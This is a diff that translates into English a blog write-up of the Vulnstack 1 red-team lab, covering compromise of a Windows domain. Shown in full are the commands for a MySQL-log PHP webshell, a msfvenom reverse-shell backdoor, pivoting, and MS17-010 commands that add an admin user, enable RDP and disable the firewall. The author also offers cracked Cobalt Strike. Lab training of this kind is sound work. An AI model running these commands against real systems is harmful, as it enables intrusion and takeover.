@@ -11,47 +11,47 @@ tags: [
 ]
 ---
 ### Introduce
-Một ngày tình cờ vu vơ trên không gian mạng. Khi đang đọc blog của các pháp sư Trung Hoa tuổi trẻ tài cao. Tôi tình cờ  biết đến loạt bài lab red team thực chiến . Thấy phạm vi của lab khá rộng, attack từ mạng ngoài vào DMZ rồi vào internal network, domain, pivot, xoay vòng, … giống như mô hình mạng của một công ty, doanh nghiệp vậy. Nên tôi quyết định phải chinh phục hết toàn bộ series lab. Series này là vulnstack, gồm 7 phần từ 1-7. Được tạo bởi nhóm bảo mật Red Sun. Mỗi lab khoảng từ 10 – 25GB. Tải từ cloud của baidu. Tải thôi cũng mất nguyên mấy ngày.
+One idle day wandering around in cyberspace. While reading the blogs of the young and talented Chinese wizards. I happened to come across a series of real-combat red team labs. Seeing that the lab's scope was quite broad, attacking from the external network into the DMZ then into the internal network, domain, pivoting, going around in circles, … just like the network model of a company or enterprise. So I decided I had to conquer the whole lab series. This series is vulnstack, with 7 parts from 1-7. Created by the Red Sun security group. Each lab is about 10 – 25GB. Downloaded from baidu's cloud. Just downloading took several whole days.
 
-Đây là bài viết đầu tiên cũng như là phần thứ nhất trong series gồm 7 phần của tôi. Đây cũng như nơi tôi ghi chép  cho những gì mình đã làm, đã học được từ bài lab. Nên tôi cũng sẽ cố gắng để đi rộng, tận dụng nhiều phương thức khác nhau để khai  thác với mục đích học tập là chính. Cũng hi vọng bạn đọc blog này cũng sẽ học được ít nhiều thông qua bài viết.
-Thông tin chính thức của Vulnstack  1 tại đây: http://vulnstack.qiyuanxuetang.net/vuln/detail/2/
+This is the first post as well as the first part of my 7-part series. It's also like a place where I take notes on what I did and learned from the lab. So I'll also try to go broad, making use of many different methods to exploit, mainly for learning purposes. I also hope you reading this blog will learn a little something through the post.
+Official information about Vulnstack 1 here: http://vulnstack.qiyuanxuetang.net/vuln/detail/2/
 ### Setup
-Mô hình lab
+Lab diagram
 
 ![image](https://raw.githubusercontent.com/tranquac/Blog_Image/master/vulnstack1/1.jpg)
 
-Windows 7 ở ngoài gồm 2 card mạng
+The external Windows 7 has 2 network cards
 
 ![image](https://raw.githubusercontent.com/tranquac/Blog_Image/master/vulnstack1/2.jpg)
 
-2 máy win server 2003 và 2008 nằm bên trong sẽ chỉ gồm 1 card mạng. Từ ngoài muốn nhìn được phải thông qua windows 7
+The 2 internal machines, win server 2003 and 2008, have only 1 network card. To be seen from outside you have to go through windows 7
 
 ![image](https://raw.githubusercontent.com/tranquac/Blog_Image/master/vulnstack1/3.jpg)
 
 ![image](https://raw.githubusercontent.com/tranquac/Blog_Image/master/vulnstack1/4.jpg)
-Còn lại tất cả đều đặt theo mặc định
+Everything else is left at default
 
-Password mặc định ban đầu là: **HONGRISEC@2019**. Password hết hạn nên sẽ đổi thành: **quac@1234**
+The initial default password is: **HONGRISEC@2019**. The password expired so it's changed to: **quac@1234**
 
-IP máy win server 2003 : 192.168.52.141
+win server 2003 machine IP : 192.168.52.141
 
 ![image](https://raw.githubusercontent.com/tranquac/Blog_Image/master/vulnstack1/5.jpg)
 
-IP máy win server 2008 : 192.168.52.138
+win server 2008 machine IP : 192.168.52.138
 
 ![image](https://raw.githubusercontent.com/tranquac/Blog_Image/master/vulnstack1/6.jpg)
 
-IP máy win 7: 192.168.52.143 và 192.168.18.128 (NAT bên ngoài nhìn thấy)
+win 7 machine IP: 192.168.52.143 and 192.168.18.128 (NAT visible from outside)
 
 ![image](https://raw.githubusercontent.com/tranquac/Blog_Image/master/vulnstack1/7.jpg)
 
 ![image](https://raw.githubusercontent.com/tranquac/Blog_Image/master/vulnstack1/8.jpg)
 
-Máy attacker: Kali Linux 
+Attacker machine: Kali Linux 
 
 ![image](https://raw.githubusercontent.com/tranquac/Blog_Image/master/vulnstack1/9.jpg)
 
-Khởi động ứng dụng vuln từ windows 7
+Starting the vuln application from windows 7
 
 ![image](https://raw.githubusercontent.com/tranquac/Blog_Image/master/vulnstack1/10.jpg)
 
@@ -68,32 +68,32 @@ Nmap scan Windows 7
 
 Open port 80, 3306
 
-Truy cập vào ứng dụng web
+Accessing the web application
 
 ![image](https://raw.githubusercontent.com/tranquac/Blog_Image/master/vulnstack1/12.jpg)
 
 "PhpStudy is a program integration package for a PHP debugging environment. The package integrates the latest Apache+PHP+MySQL+phpMyAdmin+Zend Optimizer. It can be installed at one time and used without configuration. It is a very convenient and useful PHP debugging environment."
 
-Sử dụng Dirsearch ta tìm được
+Using Dirsearch we find
 
 ![image](https://raw.githubusercontent.com/tranquac/Blog_Image/master/vulnstack1/13.jpg)
 
 ![image](https://raw.githubusercontent.com/tranquac/Blog_Image/master/vulnstack1/14.jpg)
 
-Thử với username/password mặc định: root/root -> đăng nhập thành công vào phpmyadmin
+Trying the default username/password: root/root -> successfully logged into phpmyadmin
 
 ![image](https://raw.githubusercontent.com/tranquac/Blog_Image/master/vulnstack1/15.jpg)
 
-Thử lấy shell bằng cách này nhưng không được vì MySQL server đang chạy option --secure-file-priv (The --secure-file-priv option is a system variable used by MySQL to limit the ability of the users to export or import data from the database server.)
+I tried to get a shell this way but it didn't work because the MySQL server is running the --secure-file-priv option (The --secure-file-priv option is a system variable used by MySQL to limit the ability of the users to export or import data from the database server.)
 https://sebhastian.com/mysql-fix-secure-file-priv-error/ 
 
 ![image](https://raw.githubusercontent.com/tranquac/Blog_Image/master/vulnstack1/16.jpg)
 
 ![image](https://raw.githubusercontent.com/tranquac/Blog_Image/master/vulnstack1/17.jpg)
 
-secure_file_priv là NULL, nghĩa là Mysql không được phép export và import, do đó sẽ bị báo lỗi. Để thực hiện xuất câu lệnh thành công, bạn cần sửa đổi my.ini tệp trong thư mục Mysql và thêm vào [mysqld] secure_file_priv =""
+secure_file_priv is NULL, meaning Mysql isn't allowed to export and import, so it throws an error. To run the export statement successfully, you need to modify the my.ini file in the Mysql directory and add [mysqld] secure_file_priv =""
 
-Vậy ta sẽ đi tìm cách khác 
+So we'll go look for another way 
 #### RCE via MySQL Log File
 ```
 show variables like '%general%';
@@ -102,21 +102,21 @@ show variables like '%general%';
 ![image](https://raw.githubusercontent.com/tranquac/Blog_Image/master/vulnstack1/18.jpg)
 
 ```
-general_log  #đề cập đến trạng thái lưu log
-general_log_file  #đề cập đến đường dẫn lưu trữ log
+general_log  #refers to the log-saving state
+general_log_file  #refers to the log storage path
 ```
 
-Vậy trong trường hợp này nếu general_log được là ON và thay đổi đường dẫn general_log_file và ghi cái thứ gì đó thú vị vào. Liệu chúng ta có thể getshell?
+So in this case, if general_log is ON and we change the general_log_file path and write something interesting into it. Can we getshell?
 ```
 SET GLOBAL general_log = ‘on’;
 SET GLOBAL general_log_file = “C:/phpStudy/www/backdoor0.php’;
 SELECT ' <?php echo exec($_GET["cmd"]);?>';
 ```
-Ta biết được đường dẫn qua đây
+We learn the path from here
 
 ![image](https://raw.githubusercontent.com/tranquac/Blog_Image/master/vulnstack1/19.jpg)
 
-Thử vào giao diện của Windows 7 để xem log được lưu lại:
+Let's check the Windows 7 interface to see the saved log:
 
 ![image](https://raw.githubusercontent.com/tranquac/Blog_Image/master/vulnstack1/20.jpg)
 
@@ -124,62 +124,62 @@ Nice
 
 ![image](https://raw.githubusercontent.com/tranquac/Blog_Image/master/vulnstack1/21.jpg)
 
-Thành công RCE. Để học được nhiều hơn tôi sẽ không dừng lại ở đây. Sẽ đi tìm những cách khác nữa
+RCE successful. To learn more I won't stop here. I'll go find other ways too
 #### RCE via YxCMS
 ![image](https://raw.githubusercontent.com/tranquac/Blog_Image/master/vulnstack1/22.jpg)
 
-Có một CSDL là newyscms. Vậy chắc chắn sẽ có 1 site chạy cms này. Tiếp tục đi tìm. Thử 1 vài lần thì tìm thấy nó tại
+There's a database called newyscms. So there must be a site running this cms. Let's keep looking. After a few tries I found it at
 
 ![image](https://raw.githubusercontent.com/tranquac/Blog_Image/master/vulnstack1/23.jpg)
 
-Tìm thấy thông tin đăng nhập trang admin ở ngay trên trang chính. 
+Found the admin-page login credentials right on the main page. 
 
 ![image](https://raw.githubusercontent.com/tranquac/Blog_Image/master/vulnstack1/24.jpg)
 
-Đăng nhập thành công vào trang admin. Vậy mà ban đầu mình không nhìn thấy còn vào Database thêm user admin khác rồi đăng nhập
+Successfully logged into the admin page. And yet at first I didn't notice it and even went into the Database to add another admin user and then logged in
 
 ![image](https://raw.githubusercontent.com/tranquac/Blog_Image/master/vulnstack1/25.jpg)
 
-Trong phần chỉnh sửa font-end template
+In the front-end template editing section
 
 ![image](https://raw.githubusercontent.com/tranquac/Blog_Image/master/vulnstack1/26.jpg)
 
 ![image](https://raw.githubusercontent.com/tranquac/Blog_Image/master/vulnstack1/27.jpg)
 
-Chỉnh sửa index_index.php bằng mã php cho phép thực thi một OS command bằng lệnh gọi hàm system()
+Edit index_index.php with php code that allows executing an OS command through a call to the system() function
 
 ![image](https://raw.githubusercontent.com/tranquac/Blog_Image/master/vulnstack1/28.jpg)
 
-Thành công RCE
+RCE successful
 
 ![image](https://raw.githubusercontent.com/tranquac/Blog_Image/master/vulnstack1/29.jpg)
 
-Tạo meterpreter shell php raw
+Create a raw php meterpreter shell
 
 ![image](https://raw.githubusercontent.com/tranquac/Blog_Image/master/vulnstack1/30.jpg)
 
-Sửa nó như thế này
+Edit it like this
 
 ![image](https://raw.githubusercontent.com/tranquac/Blog_Image/master/vulnstack1/31.jpg)
 
 ![image](https://raw.githubusercontent.com/tranquac/Blog_Image/master/vulnstack1/32.jpg)
 
-Chúng ta có shell meterpreter PHP ở đây. Nhưng hình nó không được ổn định cho lắm và php meterpreter shell bị hạn chế các module, chức năng. Vì vậy tôi sẽ sử dụng một meterpreter backdoor exe khác để đảm bảo độ ổn định:
+We have a PHP meterpreter shell here. But it seems not very stable and the php meterpreter shell is limited in modules and features. So I'll use another meterpreter backdoor exe to ensure stability:
 ```
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.18.130 LPORT=443 -f exe -o rs_backdoor.exe
 ```
-Tiến hành upload lên từ php meterpreter shell
+Proceed to upload it from the php meterpreter shell
 
 ![image](https://raw.githubusercontent.com/tranquac/Blog_Image/master/vulnstack1/33.jpg)
 
-Thực thi bằng backdoor ban đầu:\
+Execute via the initial backdoor:\
 ```http://192.168.18.128/yxcms/index.php?cmd=C:\phpStudy\WWW\yxcms\rs_backdoor.exe```
-Và kết quả chúng ta có  được meterpreter shell xịn
+And the result, we get a proper meterpreter shell
 
 ![image](https://raw.githubusercontent.com/tranquac/Blog_Image/master/vulnstack1/34.jpg)
 
-Dễ dàng đạt được đặc quyền cao nhất của windows: ```NT AUTHORITY\SYSTEM``` bằng metasploit với getsystem command\
-Nếu các bạn muốn thực hành tay lỗi này để leo lang đặc quyền trong windows thì xem ở đây:
+You easily reach the highest privilege on windows: ```NT AUTHORITY\SYSTEM``` with metasploit using the getsystem command\
+If you want to practice this privilege-escalation technique on windows by hand, check here:
 
 https://medium.com/r3d-buck3t/impersonating-privileges-with-juicy-potato-e5896b20d505
 
@@ -197,7 +197,7 @@ Using mimikatz dump password user
 
 ### Recon Internal Network
 
-Một số lệnh thực hiện trên máy Windows 7 để lấy truy vấn thông tin và truy vấn thông tin domain:\
+Some commands run on the Windows 7 machine to query information and query domain information:\
 **Query command**
 ```
 ipconfig /all
@@ -244,25 +244,25 @@ net group "domain computers"/domain : View the list of domain member computers
 group "domain computers" /domain : View other user in domain
 net group "domain controllers" /domain : View domain controller
 ```
-Và rất nhiều command khác. Sau khi có ít nhiều thông tin về server cũng như domain GOD.ORG .Giờ chúng ta sẽ scan, exploit mạng internal bên trong
+And many other commands. After getting some information about the server as well as the GOD.ORG domain. Now we'll scan and exploit the internal network
 
-**Các subnet của server**\
+**The server's subnets**\
 run get_local_subnets
 
 ![image](https://raw.githubusercontent.com/tranquac/Blog_Image/master/vulnstack1/39.jpg)
 
-Như vậy đúng là có 2 subnet là dải 192.168.18.0/24 và 192.168.52.0/24. Dải 192.168.18.0/24 là dải  từ máy kali của chúng ta có thể nhìn thấy. 192.168.52.0/24 là dải mạng internal bên trong. Giờ hãy scan để xem các host có trong mạng internal
+So indeed there are 2 subnets, the 192.168.18.0/24 range and the 192.168.52.0/24 range. The 192.168.18.0/24 range is the one our kali machine can see. 192.168.52.0/24 is the internal network range. Now let's scan to see which hosts are in the internal network
 
-**scan host bên trong mạng internal sử dụng metasploit:**
+**scan hosts inside the internal network using metasploit:**
 ```
 run arp_scanner -r 192.168.52.0/24
 ```
-như vậy ngoài 192.168.52.143 là IP của máy windows 7 thì bên trong chúng ta còn thấy 2 server khác nữa là 192.168.52.138 và 192.168.52.141
+so besides 192.168.52.143 which is the windows 7 machine's IP, inside we also see 2 other servers, 192.168.52.138 and 192.168.52.141
 
 ![image](https://raw.githubusercontent.com/tranquac/Blog_Image/master/vulnstack1/40.jpg)
 
-**scan port sử dụng metasploit:**\
-Muốn nhìn được mạng internal bên trong chúng ta phải add route cho metasploit
+**scan ports using metasploit:**\
+To see the internal network we have to add a route in metasploit
 ```
 meterpreter > run post/multi/manage/autoroute CMD=add SUBNET=192.168.52.0 NETMASK=255.255.255.0 #add route
 route add 192.168.52.0 255.255.255.0 1(session id) #other way add route
@@ -272,38 +272,38 @@ route add 192.168.52.0 255.255.255.0 1(session id) #other way add route
 
 ![image](https://raw.githubusercontent.com/tranquac/Blog_Image/master/vulnstack1/42.jpg)
 
-**Hãy xem cách khác ít lệ thuộc metasploit hơn bằng nnap: Kết hợp nmap + proxychains + socks5 proxy**\
-tạo socks proxy với metasploit (lưu ý cũng cần add route mạng internal trước)
+**Let's look at another way less dependent on metasploit, using nmap: combining nmap + proxychains + socks5 proxy**\
+create a socks proxy with metasploit (note you also need to add the internal-network route first)
 
 ![image](https://raw.githubusercontent.com/tranquac/Blog_Image/master/vulnstack1/43.jpg)
 
-Thay đổi file config proxychains
+Change the proxychains config file
 
 ![image](https://raw.githubusercontent.com/tranquac/Blog_Image/master/vulnstack1/44.jpg)
 
-Nmap scan thành công mạng internal qua socks5 proxy được tạo bởi metasploit
+Nmap successfully scans the internal network through the socks5 proxy created by metasploit
 
 ![image](https://raw.githubusercontent.com/tranquac/Blog_Image/master/vulnstack1/45.jpg)
 
-**Giờ chúng ta không muốn lệ thuộc vào metasploit. Cùng tạo socks proxy không dùng metasploit**\
-ở đây mình sử dụng công cụ gost: https://github.com/ginuerzh/gost . Vì mình thích golang. Nên mình cũng thích sử dụng những công cụ được viết bằng go. Ngoài ra còn rất nhiều công cụ để tạo socks proxy khác: Chisel, …\
-Download phiên bản cho windows, tải và chạy trên windows 7\
+**Now we don't want to depend on metasploit. Let's create a socks proxy without using metasploit**\
+here I use the tool gost: https://github.com/ginuerzh/gost . Because I like golang. So I also like using tools written in go. There are also many other tools to create a socks proxy: Chisel, …\
+Download the windows version, download and run it on windows 7\
 ```
 .\gost-windows-386.exe -L socks5://:9000
 ```
-Lúc này ta đã có một socks5 proxy là máy windows 7, port 9000. 
+At this point we have a socks5 proxy that is the windows 7 machine, port 9000. 
 
 ![image](https://raw.githubusercontent.com/tranquac/Blog_Image/master/vulnstack1/46.jpg)
 
 ![image](https://raw.githubusercontent.com/tranquac/Blog_Image/master/vulnstack1/47.jpg)
 
-**Để trực quan hơn chúng ta có thể sử dụng cobalt strike**
+**For a more visual approach we can use cobalt strike**
 
 ![image](https://raw.githubusercontent.com/tranquac/Blog_Image/master/vulnstack1/48.jpg)
 
 ![image](https://raw.githubusercontent.com/tranquac/Blog_Image/master/vulnstack1/49.jpg)
 
-Công cụ này là một trong những công cụ cực kì tuyệt vời và nhiều tính năng, được sử dụng rất phổ biến trong các cuộc tấn công APT. Nhưng cũng không dễ để tìm được 1 bản crack ổn định cũng như đầy đủ các tính năng. Các bạn có thể tự tìm hiểu thêm về nó nhé. Sau hàng chục bản, mình cũng tìm được 1 vài bản ổn định. Nếu muốn các bạn có thể liên hệ với mình nhé!
+This tool is one of the extremely great, feature-rich tools, very commonly used in APT attacks. But it's also not easy to find a stable crack with all the features. You can research it more on your own. After dozens of versions, I did find a few stable ones. If you want, you can contact me!
 
 ### Exploit Internal Network
 #### 192.168.51.141
@@ -313,7 +313,7 @@ Scan qua proxychains
 
 ![image](https://raw.githubusercontent.com/tranquac/Blog_Image/master/vulnstack1/51.jpg)
 
-Scan qua proxychains khá lâu. Có thể tải nmap về máy windows 7 rồi thực hiện scan hay cũng có thể remote desktop trực tiếp vào máy windows 7\
+Scanning through proxychains is quite slow. You can download nmap onto the windows 7 machine and run the scan, or you can also remote desktop directly into the windows 7 machine\
 **Enable RDP, open port 3389**\
 Using registry : If open, change 0 to 1
 ```
@@ -332,13 +332,13 @@ Attacker remote
 ```
 root@kali# rdesktop 192.168.18.128:3389
 ```
-Sử dụng account đã lấy được khi dump với mimikatz
+Using the account obtained when dumping with mimikatz
 
 ![image](https://raw.githubusercontent.com/tranquac/Blog_Image/master/vulnstack1/52.jpg)
 
 ![image](https://raw.githubusercontent.com/tranquac/Blog_Image/master/vulnstack1/53.jpg)
 #### 192.168.51.138
-Scan với nmap đã tải về máy Windows 7
+Scanning with nmap downloaded onto the Windows 7 machine
 
 ![image](https://raw.githubusercontent.com/tranquac/Blog_Image/master/vulnstack1/54.jpg)
 
@@ -352,26 +352,26 @@ Scan với nmap đã tải về máy Windows 7
 | Windows Server 2003   | Internal Network  : 192.168.52.141        | ROOT-TVI862UBEH |
 | Windows Server 2008   | Internal Network  : 192.168.52.138        | OWA (domain controller) |
 
-Sau khi scan thấy cả 2 máy chủ internal bên trong đều open port 445 nên ta sẽ thử một làn sóng quét Eternal Blue
-Dường như cả 2 máy chủ internal đều bị ảnh hưởng
+After scanning and seeing that both internal servers have port 445 open, we'll try a wave of Eternal Blue scanning
+It seems both internal servers are affected
 
 ![image](https://raw.githubusercontent.com/tranquac/Blog_Image/master/vulnstack1/56.jpg)
 
 ![image](https://raw.githubusercontent.com/tranquac/Blog_Image/master/vulnstack1/57.jpg)
 
-Cũng có thể sử dụng nmap với script : --script=smb-vuln-ms17-010.nse
+You can also use nmap with the script : --script=smb-vuln-ms17-010.nse
 
-**Khai thác**
+**Exploitation**
 
 ![image](https://raw.githubusercontent.com/tranquac/Blog_Image/master/vulnstack1/58.jpg)
 
-Mặc dù vậy nhưng thử nhiều lần tôi vẫn không để lấy được shell của cả 2 máy chủ đó
+Even so, after many attempts I still couldn't get a shell on either of those two servers
 
-Tại thời điểm này tôi vẫn cố gắng thử bằng nhiều cách. Tôi sử dụng một module khác cho phép chạy các command riêng lẻ tới máy chủ. Nó thành công. Thay vì lấy shell ta có thể tạo user mới trên hệ thống và RDP trực tiếp tới
+At this point I kept trying in many ways. I used another module that allows running individual commands on the server. It worked. Instead of getting a shell we can create a new user on the system and RDP directly to it
 
 ![image](https://raw.githubusercontent.com/tranquac/Blog_Image/master/vulnstack1/59.jpg)
 
-Đầu tiên tôi sẽ tạo một người dùng mới\
+First I'll create a new user\
 ```
 use auxiliary/admin/smb/ms17_010_command
 set rhosts 192.168.52.141
@@ -379,35 +379,35 @@ set command net user quac quac@1234 /add
 ```
 ![image](https://raw.githubusercontent.com/tranquac/Blog_Image/master/vulnstack1/60.jpg)
 
-Sau đó là add người dùng đó vào group admin
+Then add that user to the admin group
 ```
 set command net localgroup administrators quac /add
 ```
-Xác nhận người dùng đã được thêm vào
+Confirm the user was added
 ```
 set command net localgroup administrators
 ```
-Cuối cùng là mở port 3389 cho phép Remote Desktop
+Finally, open port 3389 to allow Remote Desktop
 ```
 set command 'REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f'
 ```
-Trước và sau khi open 3389
+Before and after opening 3389
 
 ![image](https://raw.githubusercontent.com/tranquac/Blog_Image/master/vulnstack1/61.jpg)
 
-Giờ đây tôi có thể remote tới máy chủ này thông qua proxychains
+Now I can remote to this server through proxychains
 
 ![image](https://raw.githubusercontent.com/tranquac/Blog_Image/master/vulnstack1/62.jpg)
 
-Thành công remote tới máy chủ Windows server 2003 - ROOT-TVI862UBEH
+Successfully remoted to the Windows server 2003 machine - ROOT-TVI862UBEH
 
 ![image](https://raw.githubusercontent.com/tranquac/Blog_Image/master/vulnstack1/63.jpg)
 
-Thật lạ. Trên máy chủ domain controller 192.168.52.138. Tôi có thể thêm tài khoản, open port 3389 nhưng không thể remote desktop đến được:
+Strange. On the domain controller server 192.168.52.138. I can add an account, open port 3389 but can't remote desktop to it:
 
 ![image](https://raw.githubusercontent.com/tranquac/Blog_Image/master/vulnstack1/64.jpg)
 
-Mở port thành công:
+Port opened successfully:
 
 ![image](https://raw.githubusercontent.com/tranquac/Blog_Image/master/vulnstack1/65.jpg)
 
@@ -417,55 +417,55 @@ msf6 auxiliary(admin/smb/ms17_010_command) > set command netstat -anot
 
 ![image](https://raw.githubusercontent.com/tranquac/Blog_Image/master/vulnstack1/67.jpg)
 
-Mặc dù 3389 LISTEN trên all interface nhưng từ bên ngoài scan thì port này ra kết quả là đang close
+Although 3389 is LISTENing on all interfaces, scanning from outside shows this port as closed
 
 ![image](https://raw.githubusercontent.com/tranquac/Blog_Image/master/vulnstack1/68.jpg)
 
-Tôi nghĩ đến. Đây có thể là do tưởng lửa của máy chủ này. Ngay sau đó tôi đã thực hiện một lệnh để tắt tưởng lửa trên máy chủ này:
+I had a thought. This might be due to this server's firewall. Right after that I ran a command to turn off the firewall on this server:
 ```
 set command netsh advfirewall set allprofiles state off
 ```
 ![image](https://raw.githubusercontent.com/tranquac/Blog_Image/master/vulnstack1/69.jpg)
 
-Thử lại nào:
+Let's try again:
 
 ![image](https://raw.githubusercontent.com/tranquac/Blog_Image/master/vulnstack1/70.jpg)
 
-Thành công! Lúc này ta có thể remote đến máy chủ:
+Success! Now we can remote to the server:
 
 ![image](https://raw.githubusercontent.com/tranquac/Blog_Image/master/vulnstack1/71.jpg)
 
-Giờ đây tôi đã thành công kiểm soát được cả 2 máy chủ trong internal.
+Now I've successfully taken control of both servers in the internal network.
 
-Vì mục đích học tập nên tôi sẽ tiếp tục tìm hiểu thêm về domain này. Giả sử máy chủ domain controller không bị ảnh hưởng bởi lỗ hổn ms17_010. Khi khai thác thành công Windows 7. Ta đã tải lên mimikatz và lấy được thông tin của 1 tài khoản trong miền GOD.ORG
+For learning purposes I'll keep exploring this domain. Suppose the domain controller server isn't affected by the ms17_010 vulnerability. When we successfully exploit Windows 7. We uploaded mimikatz and obtained the information of one account in the GOD.ORG domain
 
 ![image](https://raw.githubusercontent.com/tranquac/Blog_Image/master/vulnstack1/72.jpg)
 
-Hãy xem tôi sử dụng tài khoản này để làm gì nhé:\
-Đầu tiên. Tạo một IPC connect tới máy chủ Domain controller 192.168.52.138
+Let's see what I use this account for:\
+First. Create an IPC connection to the Domain controller server 192.168.52.138
 ```
 net use \\192.168.52.138\c$ "quac@1234" /user:"administrator"
 dir \\192.168.52.138\$
 ```
 ![image](https://raw.githubusercontent.com/tranquac/Blog_Image/master/vulnstack1/73.jpg)
 
-Copy backdoor đã gen từ msfvenom
+Copy the backdoor generated from msfvenom
 ```
 copy C:\phpStudy\WWW\yxcms\rs_backdoor.exe \\192.168.52.138\c$
 ```
 ![image](https://raw.githubusercontent.com/tranquac/Blog_Image/master/vulnstack1/74.jpg)
 
-Thiết lập một Windows Task Scheduler chạy backdoor:
+Set up a Windows Task Scheduler to run the backdoor:
 ```
 schtasks /create /tn "backdoor" /tr C:\rs_backdoor.exe /sc minute  /mo 1  /S 192.168.52.138 /RU System  /u administrator /p "quac@1234"
 ```
 (/s computer :	Specifies the name or IP address of a remote computer (with or without backslashes). The default is the local computer.
 
-Nó chưa thành công. Là vì máy chủ trong internal này không nhìn thấy được máy kali bên ngoài của tôi để kết nối tới. Phải chăng là do vậy? Nhưng khi tôi thử làm một điều khác:
+It didn't work yet. It's because this internal server can't see my external kali machine to connect to. Is that the reason? But when I tried something else:
 ```
 schtasks /create /tn "backdoor" /tr notepad /sc minute  /mo 1  /S 192.168.52.138 /RU System  /u administrator /p "quac@1234"
 ```
-Là bật notepad thì nó cũng không được thực thi. Cũng không thể xem các schtasks
+Which was launching notepad, it also didn't get executed. I also couldn't view the schtasks
 ![image](https://raw.githubusercontent.com/tranquac/Blog_Image/master/vulnstack1/75.jpg)
 :((
 ### Bloodhound
@@ -473,21 +473,21 @@ BloodHound is a data visualisation tool, meaning without any data is not at all 
 
 In order for BloodHound to do its magic, we need to enumerate a victim domain. The enumeration process produces a JSON file that describes various relationships and permissions between AD objects as mentioned earlier, which can then be imported to BloodHound. Once the resulting JSON file is ingested/imported to BloodHound, it will allow us to visually see the ways (if any) how Active Directory and its various objects can be (ab)used to elevate privileges, ideally to Domain Admin.
 
-Tải về SharpHound.exe để thu thập thông tin
+Download SharpHound.exe to collect information
 
 ![image](https://raw.githubusercontent.com/tranquac/Blog_Image/master/vulnstack1/76.jpg)
 
 ![image](https://raw.githubusercontent.com/tranquac/Blog_Image/master/vulnstack1/77.jpg)
 
-Nhưng dường như nó không thể chạy trên windows 7, hoặc ít nhất là không thể chạy trên máy chủ này. Tôi sẽ sử dụng nó trong các bài vulnstack tới đây.
+But it seems it can't run on windows 7, or at least can't run on this server. I'll use it in the upcoming vulnstack posts.
 
-Đã học được:\
-&ensp;&ensp;&ensp;&ensp;Kiên trì, tận dụng những thứ có sẵn để tấn công mục tiêu\
-&ensp;&ensp;&ensp;&ensp;RCE qua MySQL log file\
-&ensp;&ensp;&ensp;&ensp;Và nhiều điều hay ho khác
+What I learned:\
+&ensp;&ensp;&ensp;&ensp;Persistence, making use of what's available to attack the target\
+&ensp;&ensp;&ensp;&ensp;RCE via MySQL log file\
+&ensp;&ensp;&ensp;&ensp;And many other cool things
 
-Cảm ơn vì đã đọc bài viết của tôi. Hi vọng các bạn sẽ học được gì từ đây. Tôi sẽ sớm ra Vulnstack 2 sau khi hoàn thành.
+Thanks for reading my post. I hope you learned something from here. I'll release Vulnstack 2 soon after I finish it.
 
-Tham khảo:
+References:
 
 https://blog.csdn.net/weixin_39190897/article/details/99108699 
